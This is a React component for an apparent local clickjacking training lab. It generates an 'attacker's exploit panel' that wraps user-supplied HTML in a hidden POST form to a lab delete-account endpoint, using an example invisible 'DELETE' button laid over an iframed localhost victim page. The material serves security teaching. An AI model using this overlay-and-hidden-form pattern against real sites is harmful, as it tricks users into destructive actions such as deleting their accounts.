import React, { useState } from "react";
import "./ExploitPanel.css";

function ExploitPanel() {
  const [userButtonCode, setUserButtonCode] = useState("");
  const [finalExploit, setFinalExploit] = useState("");

  // Generate the final exploit HTML by wrapping user-provided button in a form
  const handleGenerateExploit = (e) => {
    e.preventDefault();

    // This is the malicious form that calls delete
    const exploitForm = `
<form id="deleteForm" method="POST" action="http://127.0.0.1:8080/api/clickJackLab1-delete-account">
  <input type="hidden" name="id" value="1" />
  <input type="hidden" name="csrf" value="dummy-csrf-token" />
  ${userButtonCode}
</form>
`;

    setFinalExploit(exploitForm);
  };

  return (
    <div className="exploit-panel-container">
      <h1>Attacker's Exploit Panel</h1>
      <p>
        Enter only your <strong>&lt;button&gt;</strong> and{" "}
        <strong>&lt;style&gt;</strong> code here. We will automatically wrap it
        in a form that calls the Delete Account endpoint.
      </p>

      <form onSubmit={handleGenerateExploit} className="exploit-input-form">
        <label htmlFor="exploitCode">Your Button &amp; Style:</label>
        <textarea
          id="exploitCode"
          rows={8}
          cols={60}
          placeholder={`Example:\n<style>\n  #deleteOverlay {\n    position: absolute;\n    top: 200px;\n    left: 100px;\n    opacity: 0.01;\n    z-index: 9999;\n  }\n</style>\n<button id="deleteOverlay" type="submit" class="bg-danger">DELETE</button>`}
          value={userButtonCode}
          onChange={(e) => setUserButtonCode(e.target.value)}
        />
        <button type="submit" className="generate-btn">
          Generate Exploit
        </button>
      </form>

      <div className="iframe-container container-fluid">
        <h2>Live Preview</h2>
        <p>
          Below is an iframe of the real <strong>EditInfo</strong> page. Your
          malicious overlay (if generated) will appear on top.
        </p>
        <div className="iframe-wrapper">
          <iframe
            title="Victim Page"
            src="http://localhost:3000/Click_Jacking/Click_Jacking_labs/lab1/EditInfo"
            className="target-iframe"
          />
          {/* The malicious overlay (absolutely positioned) */}
          <div
            className="exploit-overlay"
            dangerouslySetInnerHTML={{ __html: finalExploit }}
          />
        </div>
      </div>
    </div>
  );
}

export default ExploitPanel;
